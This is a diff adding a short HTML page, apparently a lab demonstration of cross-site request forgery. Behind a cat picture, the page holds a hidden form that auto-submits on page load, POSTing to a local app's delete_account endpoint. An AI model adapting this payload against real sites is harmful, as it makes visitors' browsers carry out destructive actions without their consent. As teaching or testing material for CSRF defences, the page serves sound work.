@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Form CSRF Attack</title>
+</head>
+<body>
+    <h1>Cat-site Request Forgery</h1>
+    <img src="https://http.cat/images/200.jpg" alt="Cat">
+    <h1>Form-based CSRF</h1>
+    <form id="csrfForm" action="http://localhost:5000/delete_account" method="POST">
+        <input type="hidden" name="csrf" value="attack">
+    </form>
+    <script>
+        window.addEventListener('load', function () {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
